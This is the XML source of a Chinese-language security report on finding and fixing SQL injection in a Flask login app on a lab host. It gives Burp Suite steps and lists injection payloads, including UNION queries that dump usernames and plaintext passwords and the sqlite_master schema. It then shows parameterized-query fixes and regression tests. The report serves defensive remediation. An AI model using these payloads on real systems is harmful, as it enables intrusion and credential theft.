        <w:t>将浏览器的 HTTP 代理设置为 127.0.0.1:8080（或你设置的端口）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>如果使用 Firefox：在设置中搜索"代理"，选择"手动代理配置"，HTTP 代理设为 127.0.0.1，端口设为 8080。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>如果使用 Chrome：需要安装 SwitchyOmega 插件或在命令行启动时添加代理参数：--proxy-server=127.0.0.1:8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>步骤三：关闭拦截或设置拦截规则</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在 Burp Suite Proxy 的 "Intercept" 标签页中，点击 "Intercept is on" 使其变为 "Intercept is off"，让请求直接通过但不中断。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>或者保持开启，每次请求时手动点击 "Forward" 放行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5.2 搜索接口注入测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>第一步：登录系统并捕获搜索请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>确保浏览器代理已指向 Burp Suite。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在浏览器中访问 http://192.168.182.130:5000/login，登录 admin 账号。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>登录后在搜索框中输入正常关键词，例如 "admin"，点击搜索。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在 Burp Suite Proxy 的 "HTTP history" 面板中找到该 GET 请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>请求路径类似于：/search?keyword=admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>第二步：将请求发送到 Repeater</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在 HTTP history 中右键点击该搜索请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>选择 "Send to Repeater"（快捷键 Ctrl+R）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>切换到 "Repeater" 标签页，可以看到完整的请求内容。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>第三步：测试 OR 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在 Repeater 中找到 URL 中的 keyword=admin 部分。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>将 admin 替换为注入 payload，注意需要对特殊字符进行 URL 编码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>原始 payload: ' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>URL 编码后: %27%20OR%20%271%27%3D%271</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>修改后的 URL: /search?keyword=%27%20OR%20%271%27%3D%271</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>点击 "Send" 按钮发送请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在右侧 "Response" 面板中查看返回的 HTML。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>第四步：观察响应确认注入生效</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在响应内容中搜索 "无搜索结果"。如果注入失败（修复后），页面显示 "无搜索结果"。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>如果注入成功（修复前），页面会显示所有用户的列表。可以搜索 "admin" 和 "alice" 两个用户名来确认。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5.3 Repeater 常用注入测试清单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>在 Repeater 中可以依次测试以下 payload，观察每次响应的变化。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50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测试编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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注入 Payload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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 编码形式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268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预期结果（修复前）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' OR '1'='1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%27%20OR%20%271%27%3D%271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返回全部用户，OR 永真条件使 WHERE 失效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' UNION SELECT 1,2,3,4,5--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%27%20UNION%20SELECT%201,2,3,4,5--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返回 5 列数字代替数据，验证 UNION 可用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' UNION SELECT 1,username,password,email,phone FROM users--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%27%20UNION%20SELECT%201,username,password,email,phone%20FROM%20users--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所有用户的用户名和密码明文显示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' UNION SELECT 1,name,sql,1,1 FROM sqlite_master--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%27%20UNION%20SELECT%201,name,sql,1,1%20FROM%20sqlite_master--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显示数据库中所有表的建表语句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' AND 1=1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%27%20AND%201%3D1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正常返回结果，AND 1=1 不影响查询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' AND 1=2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%27%20AND%201%3D2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返回空结果，AND 1=2 使条件永远为假</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>测试编号 5 和 6 是用来确认注入点是否有效的经典测试方法：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>AND 1=1 正常返回结果，说明注入的语法正确，没有破坏 SQL 结构。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>AND 1=2 返回空结果，说明注入确实影响了 WHERE 条件的真假。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>两个结果结合起来，可以确认该位置确实存在 SQL 注入漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5.4 Intruder 批量测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>如果需要批量测试多个 payload，可以使用 Burp Suite 的 Intruder 功能，但需要注意速率限制（本系统登录接口限制为每分钟 10 次请求）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在 HTTP history 中右键搜索请求，选择 "Send to Intruder"（快捷键 Ctrl+I）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在 "Positions" 标签页中，清空所有自动标记的 payload 位置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>手动选中 keyword=admin 中的 admin，点击 "Add" 标记为 payload 位置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>切换到 "Payloads" 标签页。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在 "Payload Options" 中粘贴以下 payload 列表（每行一个）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>admin</w:t>
        <w:br/>
        <w:t>%27%20OR%20%271%27%3D%271</w:t>
        <w:br/>
        <w:t>%27%20AND%201%3D1</w:t>
        <w:br/>
        <w:t>%27%20AND%201%3D2</w:t>
        <w:br/>
        <w:t>%27%20UNION%20SELECT%201,2,3,4,5--</w:t>
        <w:br/>
        <w:t>%27%20UNION%20SELECT%201,username,password,email,phone%20FROM%20users--</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>点击右上角的 "Start attack" 开始测试。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>观察每个请求的响应长度（Response Length）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>如果某个请求的响应长度明显与其他不同，说明该 payload 触发了不同的 SQL 执行结果，可能存在注入漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. 修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 什么是参数化查询</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>参数化查询（Parameterized Query）是解决 SQL 注入的标准方法，也是最有效的方法。它的核心思想是：SQL 语句的结构和数据分开传递。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>具体做法是：在 SQL 模板中，数据的位置用占位符（通常是 ?）标记，实际数据通过第二个参数单独传给数据库的 execute() 函数。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>数据库收到 SQL 模板后，先解析出完整的执行计划——确定了操作哪张表、哪个字段、什么条件——然后把参数值填入对应位置。这时候参数值里的任何特殊字符，包括单引号、分号、注释符，都只被当作普通文本处理，不会再影响 SQL 的结构。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>相当于数据库先问"你要干什么"，再问"数据是什么"。而 f-string 的做法是先把数据和结构混在一起，然后一次性告诉数据库——数据库无法区分哪部分是结构，哪部分是数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 注册接口（/register）的修复代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.route("/register", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>def register():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        password = request.form.get("password", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        email = request.form.get("email", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        phone = request.form.get("phone", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        c.execute(sql, (username, password, email, phone))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>关键变更说明：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>第 8 行：SQL 模板中的数据位置全部改为 ? 占位符，不再嵌入任何变量。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>第 9 行：execute() 的第二个参数传入实际数据，和 SQL 模板分开传递。数据库先解析 SQL 模板确定执行计划，再把数据填入占位符位置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 搜索接口（/search）的修复代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.route("/search")</w:t>
        <w:br/>
        <w:t>def search():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    keyword = request.args.get("keyword", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    sql = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    like_param = f"%{keyword}%"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql, (like_param, like_param))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>关键变更说明：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>第 4 行：SQL 模板中的 LIKE 值改为 ? 占位符，不再直接嵌入 keyword。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>第 5 行：LIKE 匹配所需的 % 符号在参数值中拼接，而不是拼到 SQL 模板里。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>第 6 行：参数和 SQL 模板分开传递。即使 keyword 中包含单引号或 OR 关键字，它们也只是 LIKE 要匹配的文本内容，不会改变 SQL 的结构。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 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1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对比项</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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修复前（f-string 拼接）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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修复后（参数化查询）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SQL 构建方式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f"SELECT ... WHERE name='{input}'"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"SELECT ... WHERE name=?"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用户输入的位置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直接拼入 SQL 字符串内部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作为参数单独传递，不在 SQL 模板中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SQL 与数据的关系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数据与结构混在一起，无法区分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结构预编译，数据后传入，互不干扰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数据库接收到的内容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一条完整的 SQL 字符串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SQL 模板 + 参数值（分开两部分）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输入 ' OR '1'='1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SELECT ... WHERE '' OR '1'='1'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参数被当作文本传给 LIKE，原样搜索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能否改变 SQL 结构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能（单引号改变了 WHERE 条件）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不能（? 占位符保护了 SQL 结构）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单引号的作用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闭合字符串，改变 SQL 逻辑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只是普通字符，作为文本内容处理</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. 修复验证结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>修复完成后，对系统进行了全部 4 组 POC 回归测试，验证漏洞是否被成功修复。测试结果如下表所示。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测试项目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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攻击输入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="141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修复前结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984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修复后结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850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OR 注入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' OR '1'='1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返回全部用户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返回 0 条记录，输入被当成普通文本搜索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已拦截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UNION 伪造数据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' UNION SELECT ...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伪造的 HACKED 用户出现在结果中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返回 0 条记录，UNION 未被执行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已拦截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UNION 窃取密码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' UNION SELECT password...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其他用户的密码明文显示在页面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密码不泄露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已拦截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注册注入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a'); --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INSERT 语句被提前结束，异常数据写入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字符串 "a'); --" 被原样写入 username 字段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已拦截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b/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>测试结论：所有 SQL 注入攻击均被有效拦截，参数化查询修复方案正确有效。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 控制台日志对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>修复前的控制台日志（SQL 语句已被篡改）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[SQL] SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>修复后的控制台日志（输入被当作参数处理）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>执行 SQL: SELECT * FROM users WHERE username LIKE ? OR email LIKE ?</w:t>
        <w:br/>
        <w:t>（参数: %' OR '1'='1%）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>修复后的日志可以清楚看到：%' OR '1'='1% 整体作为一个字符串传给数据库进行 LIKE 匹配，其中的单引号和 OR 关键字都是字符串内容的一部分，不再是 SQL 语法关键字。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. 修复总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>本次 SQL 注入漏洞修复涉及以下变更与结论。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0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5102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漏洞数量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2 处（/register 注册接口、/search 搜索接口）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风险等级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高危，CVSS 评分 8.1 和 8.6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根因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使用 f-string 将用户输入直接拼接到 SQL 语句中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修复方式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改为参数化查询，SQL 模板与数据分离传递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修改文件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app.py，共修改 2 个路由的函数体（约 10 行代码）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影响范围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仅影响 SQL 构建方式，前端模板和 API 返回格式不变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验证方式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4 组 POC 回归测试，全部通过确认修复有效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修复效果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所有 SQL 注入攻击均被有效拦截，系统恢复安全</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>核心经验：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>任何涉及数据库操作的地方，都必须使用参数化查询。永远不要用字符串拼接（包括 f-string、format()、+ 号运算符）来构建 SQL 语句。这是防御 SQL 注入最有效、最根本的手段，也是业界公认的标准实践。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="888888"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>报告生成日期: 2026-07-08 05:06</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="888888"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>本报告基于 Flask Login App 实际漏洞修复过程编写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